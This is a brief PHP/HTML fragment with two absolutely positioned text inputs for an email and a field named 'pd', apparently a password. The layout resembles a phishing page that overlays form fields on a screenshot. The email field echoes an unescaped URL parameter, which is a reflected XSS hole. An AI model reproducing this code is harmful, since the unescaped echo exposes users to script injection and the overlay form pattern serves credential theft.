...
<input name="email" value="<?=$_GET[email]?>" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:365px;left:785px;top:452px;z-index:10">
<input name="pd" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:365px;left:785px;top:535px;z-index:11">
